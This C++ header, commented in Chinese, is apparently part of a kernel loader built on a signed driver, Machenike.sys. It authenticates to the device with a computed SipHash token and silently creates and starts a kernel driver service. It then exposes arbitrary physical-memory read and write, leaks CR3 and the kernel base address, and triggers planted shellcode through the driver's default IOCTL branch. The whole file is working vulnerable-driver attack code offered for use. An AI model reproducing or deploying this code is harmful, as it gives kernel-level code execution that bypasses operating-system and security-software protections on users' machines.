#pragma once
#include "loader_common.h"

// ============================================================
// whql_io.h — WHQL 驱动 I/O 封装层
//
// 提供三个原语的 C++ 封装：
//   WhqlOpen()        打开驱动句柄（含 SipHash Token 认证）
//   WhqlGetInfo()     GET_INFO_IOCTL → 获取 CR3/KernelBase/内存布局
//   WhqlReadPhys()    READ_IOCTL     → 读任意物理内存
//   WhqlWritePhys()   WRITE_IOCTL    → 写任意物理内存（≤4KB/次，内部分块）
//   WhqlTrigger()     发送无效 IOCTL 触发 default 分支执行 Shellcode
// ============================================================

// ---- SipHash-2-4（用于生成 Token，与驱动端一致）----
static uint64_t SipHash24(const uint8_t key[16], const uint8_t* msg, size_t msgLen)
{
    uint64_t k0, k1;
    memcpy(&k0, key,     8);
    memcpy(&k1, key + 8, 8);

    uint64_t v0 = k0 ^ 0x736f6d6570736575ULL;
    uint64_t v1 = k1 ^ 0x646f72616e646f6dULL;
    uint64_t v2 = k0 ^ 0x6c7967656e657261ULL;
    uint64_t v3 = k1 ^ 0x7465646279746573ULL;

#define SIPROUND \
    v0+=v1; v1=rotl64(v1,13); v1^=v0; v0=rotl64(v0,32); \
    v2+=v3; v3=rotl64(v3,16); v3^=v2; \
    v0+=v3; v3=rotl64(v3,21); v3^=v0; \
    v2+=v1; v1=rotl64(v1,17); v1^=v2; v2=rotl64(v2,32);

    size_t i = 0;
    while (i + 8 <= msgLen) {
        uint64_t m; memcpy(&m, msg + i, 8);
        v3 ^= m; SIPROUND SIPROUND v0 ^= m;
        i += 8;
    }
    // 末尾处理
    uint64_t b = ((uint64_t)msgLen) << 56;
    size_t left = msgLen & 7;
    for (size_t j = left - 1; j < left; j--)
        b |= ((uint64_t)msg[i + j]) << (j * 8);
    v3 ^= b; SIPROUND SIPROUND v0 ^= b;
    v2 ^= 0xff;
    SIPROUND SIPROUND SIPROUND SIPROUND
    return v0 ^ v1 ^ v2 ^ v3;
#undef SIPROUND
}

// ---- Token 计算（与 drv\Main.cpp MachenikeCalcToken 一致）----
static uint32_t CalcToken(uint64_t counter, uint32_t pid)
{
    uint8_t msg[16] = {};
    memcpy(msg,      &counter, 8);
    memcpy(msg + 8,  &pid,     4);
    memcpy(msg + 12, &g_Salt4, 4);
    uint64_t h = SipHash24(g_SipHashKey, msg, sizeof(msg));
    return (uint32_t)(h ^ (h >> 32));
}

// ---- Locate WHQL Machenike.sys driver file on disk ----
static bool FindWhqlDriverFile(wchar_t* outPath, size_t maxLen)
{
    // 1. Same directory as loader executable
    wchar_t exeDir[MAX_PATH] = {};
    if (GetModuleFileNameW(NULL, exeDir, MAX_PATH)) {
        wchar_t* pSlash = wcsrchr(exeDir, L'\\');
        if (pSlash) {
            *(pSlash + 1) = L'\0';
            swprintf_s(outPath, maxLen, L"%sMachenike.sys", exeDir);
            if (GetFileAttributesW(outPath) != INVALID_FILE_ATTRIBUTES) return true;
        }
    }

    // 2. Current working directory
    if (GetFullPathNameW(L"Machenike.sys", (DWORD)maxLen, outPath, NULL)) {
        if (GetFileAttributesW(outPath) != INVALID_FILE_ATTRIBUTES) return true;
    }

    // 3. System drivers directory
    wchar_t sysDrivers[MAX_PATH] = {};
    if (GetSystemDirectoryW(sysDrivers, MAX_PATH)) {
        swprintf_s(outPath, maxLen, L"%s\\drivers\\Machenike.sys", sysDrivers);
        if (GetFileAttributesW(outPath) != INVALID_FILE_ATTRIBUTES) return true;
    }

    // 4. Optional environment variable MACHENIKE_DRV_PATH
    wchar_t envPath[MAX_PATH] = {};
    if (GetEnvironmentVariableW(L"MACHENIKE_DRV_PATH", envPath, MAX_PATH) > 0) {
        if (GetFileAttributesW(envPath) != INVALID_FILE_ATTRIBUTES) {
            wcscpy_s(outPath, maxLen, envPath);
            return true;
        }
    }

    return false;
}

// ---- Ensure WHQL driver service is created and running ----
static bool EnsureWhqlDriverLoaded(const wchar_t* serviceName = L"Machenike")
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        LOG_ERR("EnsureWhqlDriverLoaded: OpenSCManager failed (GLE=%lu)", GetLastError());
        return false;
    }

    SC_HANDLE hService = OpenServiceW(hSCM, serviceName, SERVICE_ALL_ACCESS);
    if (!hService) {
        DWORD dwErr = GetLastError();
        if (dwErr == ERROR_SERVICE_DOES_NOT_EXIST) {
            wchar_t drvPath[MAX_PATH] = {};
            if (!FindWhqlDriverFile(drvPath, MAX_PATH)) {
                LOG_ERR("EnsureWhqlDriverLoaded: Machenike.sys not found on disk");
                CloseServiceHandle(hSCM);
                return false;
            }

            LOG_INFO("EnsureWhqlDriverLoaded: Creating service '%ls' -> %ls", serviceName, drvPath);
            hService = CreateServiceW(
                hSCM, serviceName, serviceName,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL, drvPath, NULL, NULL, NULL, NULL, NULL
            );
            if (!hService) {
                LOG_ERR("EnsureWhqlDriverLoaded: CreateService failed (GLE=%lu)", GetLastError());
                CloseServiceHandle(hSCM);
                return false;
            }
        } else {
            LOG_ERR("EnsureWhqlDriverLoaded: OpenService failed (GLE=%lu)", dwErr);
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    SERVICE_STATUS status = {};
    if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_RUNNING) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return true;
    }

    LOG_INFO("EnsureWhqlDriverLoaded: Starting driver service '%ls'...", serviceName);
    if (!StartServiceW(hService, 0, NULL)) {
        DWORD dwErr = GetLastError();
        if (dwErr != ERROR_SERVICE_ALREADY_RUNNING) {
            LOG_ERR("EnsureWhqlDriverLoaded: StartService failed (GLE=%lu)", dwErr);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return false;
        }
    }

    // Wait up to 3 seconds for service to enter RUNNING state
    for (int i = 0; i < 30; i++) {
        Sleep(100);
        if (QueryServiceStatus(hService, &status) && status.dwCurrentState == SERVICE_RUNNING) {
            LOG_OK("EnsureWhqlDriverLoaded: Driver service '%ls' is RUNNING", serviceName);
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
    }

    LOG_WARN("EnsureWhqlDriverLoaded: Service state=%lu after wait", status.dwCurrentState);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return false;
}

// ---- 打开 WHQL 驱动，文件名中附带 Token（若未运行则自动加载驱动服务）----
static HANDLE WhqlOpen()
{
    // 首次尝试直接连接，若失败则自动启动驱动服务后重试
    for (int attempt = 0; attempt < 2; attempt++) {
        // 获取当前时间（Unix 秒）
        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        uint64_t ft64 = ((uint64_t)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
        uint64_t sec  = ft64 / 10000000ULL;
        if (sec >= 11644473600ULL) sec -= 11644473600ULL;
        uint64_t counter = sec / g_Step;
        uint32_t pid     = GetCurrentProcessId();

        // 尝试 counter-1、counter、counter+1（与驱动端对称）
        for (int d = -1; d <= 1; d++) {
            uint32_t token = CalcToken((uint64_t)((int64_t)counter + d), pid);
            wchar_t path[128];
            swprintf_s(path, L"\\\\.\\Machenike\\%08X", token);
            HANDLE h = CreateFileW(path,
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h != INVALID_HANDLE_VALUE) {
                LOG_OK("WhqlOpen: handle acquired (token=0x%08X)", token);
                return h;
            }
        }

        // 第一次连接失败，说明 Machenike.sys 服务尚未启动，尝试自动加载服务
        if (attempt == 0) {
            LOG_WARN("WhqlOpen: Device not ready (GLE=%u), attempting to load Machenike.sys service...", GetLastError());
            if (!EnsureWhqlDriverLoaded(L"Machenike")) {
                LOG_ERR("WhqlOpen: Failed to start Machenike.sys driver service");
                break;
            }
            Sleep(200); // 稍作等待以确保符号链接建立
        }
    }

    LOG_ERR("WhqlOpen: all token attempts failed, GLE=%u", GetLastError());
    return INVALID_HANDLE_VALUE;
}

// ---- GET_INFO: 获取 CR3/KernelBase/物理内存布局 ----
static bool WhqlGetInfo(HANDLE hDev, WINPMEM_MEMORY_INFO* pInfo)
{
    if (!pInfo) return false;
    memset(pInfo, 0, sizeof(*pInfo));

    // 使用 VirtualAlloc 分配页面对齐且全量提交的缓冲区（避免栈上 4216 字节跨页导致内核 MmProbeAndLockPages 异常引发 GLE=87）
    SIZE_T allocSize = (sizeof(WINPMEM_MEMORY_INFO) + 0xFFF) & ~0xFFF;
    WINPMEM_MEMORY_INFO* pAlignedBuf = (WINPMEM_MEMORY_INFO*)VirtualAlloc(
        NULL, allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pAlignedBuf) {
        LOG_ERR("WhqlGetInfo: VirtualAlloc failed: GLE=%u", GetLastError());
        return false;
    }
    memset(pAlignedBuf, 0, allocSize);

    DWORD dwOut = 0;
    DWORD dummyIn = 0;
    BOOL ok = DeviceIoControl(hDev,
        MACHENIKE_GET_INFO_IOCTRL,
        &dummyIn, sizeof(dummyIn),
        pAlignedBuf, (DWORD)sizeof(WINPMEM_MEMORY_INFO),
        &dwOut, NULL);

    if (!ok) {
        LOG_ERR("WhqlGetInfo failed: GLE=%u", GetLastError());
        VirtualFree(pAlignedBuf, 0, MEM_RELEASE);
        return false;
    }

    memcpy(pInfo, pAlignedBuf, sizeof(*pInfo));
    VirtualFree(pAlignedBuf, 0, MEM_RELEASE);

    LOG_OK("CR3=0x%016llX KernBase=0x%016llX Runs=%lld",
        pInfo->CR3.QuadPart, pInfo->KernBase.QuadPart,
        pInfo->NumberOfRuns.QuadPart);
    return true;
}

// ---- READ_IOCTL: 读物理内存（任意长度，内部按页分块）----
static bool WhqlReadPhys(HANDLE hDev, uint64_t physAddr, void* buf, size_t len)
{
    uint8_t* dst = (uint8_t*)buf;
    size_t   done = 0;
    while (done < len) {
        size_t chunk = min((size_t)0x1000, len - done);
        LARGE_INTEGER pa;
        pa.QuadPart = (LONGLONG)(physAddr + done);
        DWORD dwOut = 0;
        // READ_IOCTL: InBuffer=物理地址(LARGE_INTEGER), OutBuffer=数据缓冲区
        BOOL ok = DeviceIoControl(hDev,
            MACHENIKE_READ_IOCTRL,
            &pa, sizeof(pa),
            dst + done, (DWORD)chunk,
            &dwOut, NULL);
        if (!ok) {
            LOG_ERR("WhqlReadPhys: failed at PA=0x%llX+0x%llX, GLE=%u",
                physAddr, done, GetLastError());
            return false;
        }
        done += (dwOut > 0) ? dwOut : chunk;
    }
    return true;
}

// ---- WRITE_IOCTL: 写物理内存（≤4KB/次，内部分块循环）----
// 注意：驱动限制每次写入不超过 PAGE_SIZE (4096)
static bool WhqlWritePhys(HANDLE hDev, uint64_t physAddr, const void* buf, size_t len)
{
    const uint8_t* src = (const uint8_t*)buf;
    size_t done = 0;
    while (done < len) {
        size_t chunk = min((size_t)0x1000, len - done);
        LARGE_INTEGER pa;
        pa.QuadPart = (LONGLONG)(physAddr + done);
        DWORD dwOut = 0;
        // WRITE_IOCTL: InBuffer=物理地址(LARGE_INTEGER), OutBuffer=数据（用作写入源）
        BOOL ok = DeviceIoControl(hDev,
            MACHENIKE_WRITE_IOCTRL,
            &pa, sizeof(pa),
            (PVOID)(src + done), (DWORD)chunk,
            &dwOut, NULL);
        if (!ok) {
            LOG_ERR("WhqlWritePhys: failed at PA=0x%llX+0x%llX, GLE=%u",
                physAddr, done, GetLastError());
            return false;
        }
        done += chunk;
    }
    return true;
}

// ---- 触发 WHQL default 分支（Shellcode 执行）----
static bool WhqlTrigger(HANDLE hDev, uint32_t* pGle = nullptr)
{
    DWORD dwOut = 0;
    // 发一个驱动不认识的 IOCTL 码，命中 switch default case
    BOOL ok = DeviceIoControl(hDev,
        MACHENIKE_TRIGGER_IOCTRL,
        NULL, 0,
        NULL, 0,
        &dwOut, NULL);
    DWORD gle = GetLastError();
    if (pGle) *pGle = gle;

    if (ok) {
        LOG_OK("WhqlTrigger: IOCTL completed with STATUS_SUCCESS (DriverEntry returned SUCCESS)");
        return true;
    }

    // 若 ok == FALSE，宿主驱动以非成功 NTSTATUS 完成 IRP（如 DriverEntry 失败或 default 分支原本的 0xC000000D）
    LOG_WARN("WhqlTrigger: DeviceIoControl completed with error status (GLE=%u)", gle);
    return false;
}
